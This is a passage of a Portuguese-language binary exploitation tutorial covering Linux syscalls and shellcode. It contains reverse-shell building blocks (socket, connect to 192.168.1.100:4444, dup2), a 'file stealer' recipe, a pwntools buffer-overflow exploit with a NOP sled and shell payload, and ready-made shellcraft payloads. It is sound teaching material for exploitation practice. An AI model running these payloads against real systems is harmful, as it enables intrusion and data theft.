<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">section .bss</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    buffer resb 100    ; Reserva 100 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0         ; read syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0         ; fd 0 = stdin (teclado)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lea rsi, [buffer]  ; onde guardar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdx, 100       ; ler até 100 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Agora [buffer] tem o que usuário digitou</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="open---abrir-arquivos">open - Abrir arquivos<a href="#open---abrir-arquivos" class="hash-link" aria-label="Direct link to open - Abrir arquivos" title="Direct link to open - Abrir arquivos" translate="no">​</a></h3>
<p>Código para cada arquitetura:</p>
<ul>
<li class=""><code>x86</code> - 5</li>
<li class=""><code>x64</code> - 2</li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Abre arquivo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 2       ; open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rdi, [path]  ; caminho</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rsi, rsi     ; flags=O_RDONLY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov [file_fd], rax</span><br></span></code></pre></div></div>
<p>Exemplo:</p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">section .data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    filename db &#x27;/etc/passwd&#x27;, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 2         ; open syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lea rdi, [filename]; nome do arquivo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rsi, 0         ; O_RDONLY = apenas leitura</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall            ; retorna fd em rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rbx, rax       ; Salvar fd em rbx, pois rax será sobrescrito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; rbx contém agora o file descriptor (número do arquivo), que pode ser utilizado em outras funções</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exit---saída-controlada">exit - Saída controlada<a href="#exit---saída-controlada" class="hash-link" aria-label="Direct link to exit - Saída controlada" title="Direct link to exit - Saída controlada" translate="no">​</a></h3>
<p>Código para cada arquitetura:</p>
<ul>
<li class=""><code>x86</code> - 1</li>
<li class=""><code>x64</code> - 60</li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Sai sem crash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 60      ; exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, 0     ; status=0 (sucesso)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="dup2---redirecionamento">dup2 - Redirecionamento<a href="#dup2---redirecionamento" class="hash-link" aria-label="Direct link to dup2 - Redirecionamento" title="Direct link to dup2 - Redirecionamento" translate="no">​</a></h3>
<p>O dup2 redireciona entrada/saída. Se fazemos <code>dup2(socket_fd, 1)</code>, isso é igual a dizer: &quot;Quando o programa escrever na tela (1), na verdade escreva no socket (socket_fd)&quot;.</p>
<p>Código para cada arquitetura:</p>
<ul>
<li class=""><code>x86</code> - 63</li>
<li class=""><code>x64</code> - 33</li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Redireciona fd para outro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 33      ; dup2(old_fd, new_fd)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, rbx       ; socket fd criado</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rsi, 0       ; STDIN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="socket--connect---reverse-shell">socket + connect - Reverse Shell<a href="#socket--connect---reverse-shell" class="hash-link" aria-label="Direct link to socket + connect - Reverse Shell" title="Direct link to socket + connect - Reverse Shell" translate="no">​</a></h3>
<p>Imagine a internet como um sistema postal. Criar um <code>socket</code> é criar um &quot;envelope&quot; para a sua carta.</p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 41        ; syscalkl 41 = socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, 2         ; &quot;Quero um envelope para carta normal&quot; (AF_INET = internet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rsi, 1         ; &quot;Com entrega garantida&quot; (SOCK_STREAM = TCP)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, 0         ; &quot;Método padrão de entrega&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall            ; Retorna: &quot;Aqui está seu envelope número X salvo em rax&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rbx, rax       ; Salva número do socket e rbx, pois rax será sobrescrito</span><br></span></code></pre></div></div>
<p>Código para cada arquitetura:</p>
<ul>
<li class="">Socket <code>x86</code> - 102</li>
<li class="">Socket <code>x64</code> - 41</li>
</ul>
<p>Fazer <code>connect</code> é como enviar essa carta.</p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 42        ; syscall 42 = connect</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, rbx         ; &quot;Usando este envelope número X&quot; (socket_fd criado antes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rsi, [endereco]; &quot;Para este endereço específico&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, 16        ; &quot;Tamanho padrão de endereço&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall            ; *Correio pega a carta*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; O endereço (struct sockaddr)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sockaddr:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dw 2                  ; Mandamos para a internet (AF_INET) - 2 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dw 0x5c11             ; Porta 4444 = 0x115c (network byte order) - 2 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dd 0xc0a80164         ; IP 192.168.1.100 = 0x64.0x01.0xa8.0xc0 - 4 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">times 8 db 0          ; A struct precisa ter 16 bytes. Preenchemos 8 vezes o número 0x0 (8 bytes de padding)</span><br></span></code></pre></div></div>
<p>Código para cada arquitetura:</p>
<ul>
<li class="">Connect <code>x86</code> - 3</li>
<li class="">Connect <code>x64</code> - 42</li>
</ul>
<p>Com <code>socket</code> e <code>connect</code>, estabelecemos uma conexão. Para enviar dados, por exemplo, temos que usar <code>write</code>: <code>write(socket_fd, [dados], tamanho)</code></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="combinações-de-syscalls">Combinações de Syscalls<a href="#combinações-de-syscalls" class="hash-link" aria-label="Direct link to Combinações de Syscalls" title="Direct link to Combinações de Syscalls" translate="no">​</a></h3>
<p>Abrir Shell / Backdoor simples</p>
<ol>
<li class="">execve</li>
</ol>
<p>Reverse Shell</p>
<ol>
<li class="">socket() - cria socket</li>
<li class="">connect() - conecta ao atacante</li>
<li class="">dup2() - redireciona STDIN/OUT/ERR para socket</li>
<li class="">execve() - executa /bin/sh</li>
</ol>
<p>File Stealer</p>
<ol>
<li class="">open() - abre arquivo</li>
<li class="">read() - lê conteúdo</li>
<li class="">write() - escreve para socket/arquivo</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="outras-syscalls">Outras Syscalls<a href="#outras-syscalls" class="hash-link" aria-label="Direct link to Outras Syscalls" title="Direct link to Outras Syscalls" translate="no">​</a></h3>
<p>Para ver cada syscall, seu código, parâmetros e o que faz, recomendo olhar a <a class="" href="/manual-pwning/docs/extra/syscall-tb">Tabela de Syscalls para kernel Linux</a>.</p>
<p>Outros materiais também estão disponíveis na internet:</p>
<ul>
<li class=""><a href="https://www.ime.usp.br/~kon/MAC211/syscalls.html" target="_blank" rel="noopener noreferrer" class="">Tabela de Syscalls Linux x86 - IME USP</a></li>
<li class=""><a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener noreferrer" class="">Tabela de Syscalls Linux x86-64 - Fillipo</a></li>
<li class=""><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener noreferrer" class="">Tabela de Syscalls Linux x86-64 - Rchapman</a></li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="nops">NOPs<a href="#nops" class="hash-link" aria-label="Direct link to NOPs" title="Direct link to NOPs" translate="no">​</a></h2>
<p>NOP (no operation) é uma isntrução do assembly que faz exatamente o que parece: nada. Ela apenas roda a próxima instrução. Isso é muito bom para shellcodes, pois nos permite ter uma grande margem de erro para acertar onde começa a execução do shellcode. Em assembly a instrução é <code>nop</code>, e em bytes, <code>0x90</code>.</p>
<p>Assim, se quisermos fazer um shellcode com NOPs de padding:</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./program&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x90&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">240</span><span class="token plain">                 </span><span class="token comment" style="color:#999988;font-style:italic"># NOPs</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> asm</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sh</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic"># shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">312</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;A&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># Padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xffffcfb4</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># endereço do buffer + metade da largura dos nops (margem de erro)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">clean</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Tome cuidado, pois NOPs podem ter um byte diferente em outras arquiteturas. Assim, você pode usar <code>nop = asm(shellcraft.nop())</code>.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="criando-um-shellcode">Criando um Shellcode<a href="#criando-um-shellcode" class="hash-link" aria-label="Direct link to Criando um Shellcode" title="Direct link to Criando um Shellcode" translate="no">​</a></h2>
<p>Antes de criar o shellcode, vamos montar um programa para testar shellcode em C:</p>
<div class="language-C language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[insira seu shellcode aqui]&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Esse programa deve ser compilado com as flags:</p>
<ul>
<li class=""><code>-z execstack</code> - Torna a pilha (stack) executável no binário compilado. Permite executar shellcode (desativa NX/DEP).</li>
<li class=""><code>-Wno-incompatible-pointer-types</code> - Desabilita o warning específico sobre conversões de ponteiros incompatíveis, já que estamos fazendo um macete para executar o shellcode.</li>
<li class=""><code>-m32</code> - Define arquitetura de 32-bit.</li>
</ul>
<p>Assim, compilamos com: <code>gcc testador.c -o testador -z execstack -Wno-incompatible-pointer-types -m32</code></p>
<p>Agora vamos criar um Shellcode básico em assembly que simula a função <code>exit()</code> em C com o parâmetro <code>10</code> (isso faz o programa encerrar mostrando o código de status <code>10</code>). Vamos salvar o programa como <code>exit.asm</code>.</p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    section .text     ; Define que essa região do código é para as instruções</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    global _start     ; Define que o programa começa por _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov eax, 1        ; eax ( código da syscall ) = 1 ( exit )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov ebx, 10       ; ebx ( parâmetro da syscall ) = 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    int 0x80          ; Chama a syscall ( exit(10) )</span><br></span></code></pre></div></div>
<p>Para compilarmos esse programa, usaremos o <code>nasm</code> e para linkar o objeto montado pelo nasm, usaremos o <code>ld</code>.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nasm -f elf32 exit.asm -o exit.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ld -m elf_i386 exit.o -o exit</span><br></span></code></pre></div></div>
<p>Podemos executar o programa com <code>./exit</code> e ver o código de saída do programa com <code>echo $?</code>. Assim, vemos que o programa realmente encerra com o número 10.</p>
<p>O programa, após compilado, vira bytes em disco. <strong>Esses bytes de instrução são nosso shellcode</strong>. Para pegar os bytes do programa em disco, usamos <code>objdump -D exit</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">exit:     file format elf32-i386</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .text:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">08049000 &lt;_start&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049000:       b8 01 00 00 00          mov    $0x1,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049005:       bb 0a 00 00 00          mov    $0xa,%ebx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804900a:       cd 80                   int    $0x80</span><br></span></code></pre></div></div>
<p>No meio temos os bytes, na direita as respectivas instruções. Portanto, os bytes do programa são:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">b8 01 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bb 0a 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd 80</span><br></span></code></pre></div></div>
<p>Colocando eles no nosso testador:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;\xb8\x01\x00\x00\x00\xbb\x0a\x00\x00\x00\xcd\x80&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Compilando e executando:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./testador</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo $?</span><br></span></code></pre></div></div>
<p>Podemos ver que o código de saída é 10, como esperado.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="shellcode--pwntools">ShellCode + pwntools<a href="#shellcode--pwntools" class="hash-link" aria-label="Direct link to ShellCode + pwntools" title="Direct link to ShellCode + pwntools" translate="no">​</a></h2>
<p>O pwntools possui a ferramenta <code>shellcraft</code>, que tem shellcodes prontos para uso. <strong>O shellcode dado vai estar em assembly</strong> e <strong>temos que transformar em bytes</strong> usando a função <code>asm()</code>.</p>
<p>O shellcraft possui inúmeros shellcodes prontos. Se quiser, veja <a class="" href="/manual-pwning/docs/extra/shellcraft-li">Principais Funções Shellcraft</a>. Abaixo, temos alguns shellcodes populares.</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Shellcodes prontos populares</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sh</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># /bin/sh (Chama shell)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;file&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># cat file</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dupsh</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># Duplica shell para fd</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">echo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;text&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># Imprime texto</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic"># Sai do processo</span><br></span></code></pre></div></div>
<p>Como exemplo vamos fazer o mesmo código que fizemos antes de <code>exit(10)</code>, mas no pwntools.</p>
